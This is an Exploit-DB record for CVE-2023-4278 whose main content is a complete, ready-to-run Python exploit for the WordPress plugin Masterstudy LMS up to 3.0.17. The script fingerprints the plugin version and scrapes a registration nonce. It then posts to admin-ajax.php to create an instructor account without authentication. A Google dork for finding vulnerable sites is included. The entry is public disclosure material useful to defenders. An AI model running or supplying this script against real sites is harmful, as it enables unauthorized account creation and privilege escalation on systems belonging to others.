{"source": "https://www.exploit-db.com/exploits/51735", "vulnName": "Wordpress Plugin Masterstudy LMS - 3.0.17 - Unauthenticated Instructor Account Creation", "vulnEDBID": "51735", "vulnCVE": "2023-4278", "author": "REVAN ARIFIO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-10-09", "vulnContent": "# Exploit Title:  Wordpress Plugin Masterstudy LMS - 3.0.17 - Unauthenticated Instructor Account Creation\n# Google Dork: inurl:/user-public-account\n# Date: 2023-09-04\n# Exploit Author: Revan Arifio\n# Vendor Homepage: https:/.org/plugins/masterstudy-lms-learning-management-system/\n# Version: <= 3.0.17\n# Tested on: Windows, Linux\n# CVE : CVE-2023-4278\n\nimport requests\nimport os\nimport re\nimport time\n\nbanner = \"\"\"\n   _______      ________    ___   ___ ___  ____        _  _ ___ ______ ___  \n  / ____\\ \\    / /  ____|  |__ \\ / _ \\__ \\|___ \\      | || |__ \\____  / _ \\ \n | |     \\ \\  / /| |__ ______ ) | | | | ) | __) |_____| || |_ ) |  / / (_) |\n | |      \\ \\/ / |  __|______/ /| | | |/ / |__ <______|__   _/ /  / / > _ < \n | |____   \\  /  | |____    / /_| |_| / /_ ___) |        | |/ /_ / / | (_) |\n  \\_____|   \\/   |______|  |____|\\___/____|____/         |_|____/_/   \\___/ \n                                                                            \n======================================================================================================\n|| Title            : Masterstudy LMS <= 3.0.17 - Unauthenticated Instructor Account Creation       ||\n|| Author           : https://github.com/revan-ar                                                   ||\n|| Vendor Homepage  : https:/wordpress.org/plugins/masterstudy-lms-learning-management-system/      ||\n|| Support          : https://www.buymeacoffee.com/revan.ar                                         ||\n======================================================================================================\n\n\"\"\"\n\n\nprint(banner)\n\n# get nonce\ndef get_nonce(target):\n    open_target = requests.get(\"{}/user-public-account\".format(target))\n    search_nonce = re.search('\"stm_lms_register\":\"(.*?)\"', open_target.text)\n    if search_nonce[1] != None:\n        return search_nonce[1]\n    else:\n        print(\"Failed when getting Nonce :p\")\n\n\n\n# privielege escalation\ndef privesc(target, nonce, username, password, email):\n\n    req_data = {\n        \"user_login\":\"{}\".format(username),\n        \"user_email\":\"{}\".format(email),\n        \"user_password\":\"{}\".format(password),\n        \"user_password_re\":\"{}\".format(password),\n        \"become_instructor\":True,\n        \"privacy_policy\":True,\n        \"degree\":\"\",\n        \"expertize\":\"\",\n        \"auditory\":\"\",\n        \"additional\":[],\n        \"additional_instructors\":[],\n        \"profile_default_fields_for_register\":[],\n        \"redirect_page\":\"{}/user-account/\".format(target)\n        }\n\n    start = requests.post(\"{}/wp-admin/admin-ajax.php?action=stm_lms_register&nonce={}\".format(target, nonce), json = req_data)\n\n    if start.status_code == 200:\n        print(\"[+] Exploit Success !!\")\n    else:\n        print(\"[+] Exploit Failed :p\")\n\n\n\n# URL target\ntarget = input(\"[+] URL Target: \")\nprint(\"[+] Starting Exploit\")\nplugin_check = requests.get(\"{}/wp-content/plugins/masterstudy-lms-learning-management-system/readme.txt\".format(target))\nplugin_version = re.search(\"Stable tag: (.+)\", plugin_check.text)\nint_version = plugin_version[1].replace(\".\", \"\")\ntime.sleep(1)\n\nif int(int_version) < 3018:\n    print(\"[+] Target is Vulnerable !!\")\n    # Credential\n    email =  input(\"[+] Email: \")\n    username =  input(\"[+] Username: \")\n    password =  input(\"[+] Password: \")\n    time.sleep(1)\n    print(\"[+] Getting Nonce...\")\n    get_nonce = get_nonce(target)\n    # Get Nonce\n    if get_nonce != None:\n        print(\"[+] Success Getting Nonce: {}\".format(get_nonce))\n        time.sleep(1)\n        # Start PrivEsc\n        privesc(target, get_nonce, username, password, email)\n    # ----------------------------------\n    \nelse:\n    print(\"[+] Target is NOT Vulnerable :p\")\n            "}